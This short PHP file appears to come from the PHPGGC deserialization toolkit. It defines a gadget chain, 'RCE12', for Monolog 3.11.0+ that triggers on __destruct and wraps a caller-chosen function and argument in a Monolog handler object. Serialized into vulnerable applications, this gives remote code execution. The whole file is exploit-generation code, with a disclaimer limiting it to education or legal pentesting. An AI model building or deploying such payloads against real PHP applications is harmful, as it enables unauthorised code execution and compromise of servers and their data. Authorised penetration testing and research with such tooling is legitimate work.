<?php

namespace GadgetChain\Monolog;

class RCE12 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.11.0+';
    public static $vector = '__destruct';
    public static $author = 'mir-hossein (Mirhossein Rahmani)';
    public static $information = 'Please use this GC only for educational purposes or legal pentest.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\LogMonsterHandler($function, $parameter);
    }
}